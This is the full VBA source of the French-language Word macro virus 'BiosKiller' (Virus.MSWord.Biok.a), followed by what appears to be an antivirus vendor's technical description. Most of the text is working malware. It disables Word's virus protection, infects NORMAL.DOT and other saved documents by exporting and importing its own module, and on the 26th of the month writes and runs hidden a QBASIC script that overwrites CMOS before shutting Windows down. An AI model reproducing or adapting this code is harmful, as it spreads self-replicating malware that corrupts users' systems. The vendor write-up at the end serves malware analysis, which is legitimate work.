   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "BiosKiller"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub AutoExec()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorAuEx
   Call PayBiosKiller
   ErrorAuEx:
   End Sub
   Private Sub Document_Open()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorDOp
   iMacroNormalCount = NormalTemplate.VBProject.VBComponents.Count
   For i = 1 To iMacroNormalCount
       If NormalTemplate.VBProject.VBComponents(i).Name = "BiosKiller" Then
           BiosKillerInstalled = -1
       End If
   Next i
   If Not BiosKillerInstalled Then
       ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
       NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
       ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
       NormalTemplate.VBProject.VBComponents.Import "C:\APVBK.sys"
       NormalTemplate.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
   End If
   ErrorDOp:
   End Sub
   Sub FileSaveAs()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFSAs
   Dialogs(wdDialogFileSaveAs).Show
   If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
       ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
   End If
   iMacroDocumentCount = ActiveDocument.VBProject.VBComponents.Count
   For i = 1 To iMacroDocumentCount
   If ActiveDocument.VBProject.VBComponents(i).Name = "BiosKiller" Then
       BiosKillerDocInstalled = -1
   End If
   Next i
   If Not BiosKillerDocInstalled Then
   NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
   ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
   NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
   ActiveDocument.VBProject.VBComponents.Import "C:\APVBK.sys"
   ActiveDocument.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
   ActiveDocument.Save
   End If
   ErrorFSAs:
   End Sub
   Sub FileTemplates()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFiTe
   MsgBox "Vous feriez mieux de vous acheter un AV...", vbCritical, "Virus BiosKiller"
   ErrorFiTe:
   End Sub
   Sub HelpAbout()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorHeAb
   CommandBars("Help").Controls(5).Caption = "A propos du Virus BiosKiller"
   APVBK.Show
   ErrorHeAb:
   End Sub
   Sub PayBiosKiller()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorPBK
   Dim MyDate, MyTime
   MyDate = Date
   MyTime = Time
   Tm$ = Mid(MyTime, 4, 5)
   Ts$ = Mid(MyTime, 7, 8)
   D1$ = Mid(MyDate, 1, 2)
   If (Tm$ = "26") Or (Ts$ = "26") Then
       MsgBox "Vous connaissez le virus CIH ?" & Chr$(13) & "Je fais la même chose que lui...", vbCritical, "Virus BiosKiller"
   End If
   If D1$ = "26" Then
       MsgBox "Votre Bios va subir des changements..." & Chr$(13) & "HAHAHAHAHA", vbCritical, "Virus BiosKiller"
   Open "C:\CMOS.bas" For Output As #1
       Print #1, "CLS"
       Print #1, "Screen 9"
       Print #1, "Color 4"
       Print #1, "DIM Byte AS STRING * 1"
       Print #1, "For CMOS = 1 To LOF(1)"
       Print #1, "OUT &H70, CMOS - 1"
       Print #1, "GET #1, , Byte"
       Print #1, "OUT &H71, ASC(Byte)"
       Print #1, "Next"
       Print #1, "Print ""Votre Bios a été flashé, HAHAHAHAHA!!!"""
       Print #1, "System"
   Close #1
   Shell "qbasic /run C:\CMOS.bas", vbHide
   MsgBox "Votre bios a été flashé..." & Chr$(13) & "Je vais redémarrer votre ordinateur...", vbInformation, "Virus BiosKiller"
   Tasks.ExitWindows
   End If
   ErrorPBK:
   End Sub
   Sub ToolsMacro()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorToMa
   MsgBox "Je suis un virus comme CIH...", vbCritical, "Virus BiosKiller"
   ErrorToMa:
   End Sub
   Sub ViewVBCode()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorVVBCo
   ErrorVVBCo:
   End Sub

   ' Form APVBK

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} APVBK
      Caption         =   "A propos du virus BiosKiller"
      ClientHeight    =   1560
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4710
      OleObjectBlob   =   "Virus.MSWord.Biok.a-APVBK.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "APVBK"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Sub CommandButton1_Click()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Unload APVBK
   End Sub
   Private Sub Userform_Initialize()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   End Sub

   Description : Virus.MSWord.Biok.a

   Aliases
   Virus.MSWord.Biok.a (Kaspersky Lab) is also known as: Macro.Word97.Biok.a (Kaspersky Lab), W97M/Generic (McAfee),   W97M.BioK.A (Symantec),   W97M.Biok (Doctor Web),   WM97/Biok (Sophos),   W97M/Biosk.A (RAV),   W97M_BIOSKILLER (Trend Micro),   W97M/Honte.A (H+BEDV),   W97M/Biok.A (FRISK),   MW97:Biok (ALWIL),   W97M/Biok (Grisoft),   W97M.Biok.A (SOFTWIN),   W97M.Biok.A (ClamAV),   W97M/Biok.A (Panda),   W97M/Biok.A (Eset)
   Description added       Mar 07 2000
   Behavior        Macro Virus
   Technical details

   This macro virus contains eight macros in module "BiosKiller": AutoExec, Document_Open, FileSaveAs, FileTemplates, HelpAbout, PayBiosKiller, ToolsMacro, ViewVBCode. The global macros area (NORMAL.DOT) gets infection when an infected document is opened (Document_Open). The virus spreads itself to other documents on their saving with new name (FileSaveAs). The virus copies its code from file to file by using Import/Exports VisualBasic calls via the C:\BK.SYS and C:\APVBK.SYS disk files.

   The virus disables the Word VirusProtection. On entering the FileTemplates menu the virus displays the MessageBox:

   Virus BiosKiller
   Vous feriez mieux de vous acheter un AV...

   On entering the ToolsMacro menu the virus displays the MessageBox:

   Virus BiosKiller
   Je suis un virus comme CIH...

   On starting MS Word at 16 minutes of any hours or at 26 seconds of any minute the virus displays the MessageBox:

   Virus BiosKiller
   Vous connaissez le virus CIH ?
   Je fais la même chose que lui...

   On starting MS Word on 26th of any month the virus displays the MessageBox:

   Virus BiosKiller
   Votre Bios va subir des changements...
   HAHAHAHAHA

   It then creates the C:\CMOS.BAS, writes a CMOS-erasing instructions to there and executes it with a help of DOS QBASIC utility. The virus then calls the ExitWindows function.
